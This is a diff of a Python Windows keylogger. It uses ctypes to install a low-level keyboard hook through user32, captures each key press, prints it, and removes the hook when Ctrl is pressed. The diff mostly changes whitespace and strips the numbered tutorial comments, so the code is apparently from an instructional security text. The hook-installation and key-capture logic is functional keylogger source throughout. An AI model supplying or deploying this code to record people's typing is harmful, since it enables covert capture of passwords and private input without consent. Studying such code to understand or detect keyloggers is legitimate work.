@@ -3,7 +3,6 @@ from ctypes import *
 from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 
-
 user32 = windll.user32                                                            #(1)
 kernel32 = windll.kernel32
 
@@ -40,19 +39,22 @@ def getFPTR(fn):                                                                
 def hookProc(nCode, wParam, lParam):                                              #(7)
     if wParam is not WM_KEYDOWN:
         return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+
     hookedKey = chr(lParam[0])
     print hookedKey
+
     if(CTRL_CODE == int(lParam[0])):
         print "Ctrl pressed, call uninstallHook()"
         keyLogger.uninstallHookProc()
         sys.exit(-1)
+
     return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)     
 
-def startKeyLog():                                                                 #(8)
+def startKeyLog():
      msg = MSG()
      user32.GetMessageA(byref(msg),0,0,0)
     
-keyLogger = KeyLogger() #start of hook process                                     #(9)
+keyLogger = KeyLogger() #start of hook process
 pointer = getFPTR(hookProc) 
 
 if keyLogger.installHookProc(pointer):
